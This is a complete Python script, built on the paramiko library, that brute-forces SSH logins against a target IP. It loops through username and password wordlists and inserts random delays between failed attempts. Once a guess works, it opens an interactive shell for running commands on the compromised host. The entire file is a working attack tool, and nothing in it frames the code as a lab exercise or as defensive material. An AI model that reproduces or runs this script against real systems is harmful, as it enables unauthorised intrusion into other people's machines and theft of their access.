import paramiko
import time
import random

# SSH connection function
def ssh_connect(host, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=22, username=username, password=password, timeout=10)
        print(f"[SUCCESS] Found credentials - Username: '{username}' Password: '{password}'")
        return ssh
    except paramiko.AuthenticationException:
        print(f"[-] Failed for username: '{username}' and password: '{password}'")
    except paramiko.SSHException as e:
        print(f"[ERROR] SSH exception: {e}")
    except Exception as e:
        print(f"[ERROR] Unknown error: {e}")
    return None

# Brute-force operation
def brute_force_ssh(ip_address, username_file, password_file):
    try:
        # Read the username and password files
        with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()
        
        for username in usernames:
            for password in passwords:
                print(f"[+] Trying username: '{username}' and password: '{password}'")
                ssh = ssh_connect(ip_address, username, password)
                if ssh:
                    # If the connection is successful, start an interactive shell
                    print("[INFO] Interactive shell opened. You can now execute commands.")
                    while True:
                        print("'exit' to quit.")
                        command = input("Shell> ")
                        if command.lower() == 'exit':
                            ssh.close()
                            return
                        stdin, stdout, stderr = ssh.exec_command(command)
                        print(stdout.read().decode())
                        print(stderr.read().decode())
                else:
                    # Add a random delay
                    time.sleep(random.uniform(1, 3))
    except FileNotFoundError as e:
        print(f"[ERROR] File not found: {e}")
    except KeyboardInterrupt:
        print("\n[INFO] Brute-force process stopped by user.")

# Get input from the user
if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    username_file = input("Enter path to username file: ")
    password_file = input("Enter path to password file: ")
    
    brute_force_ssh(target_ip, username_file, password_file)
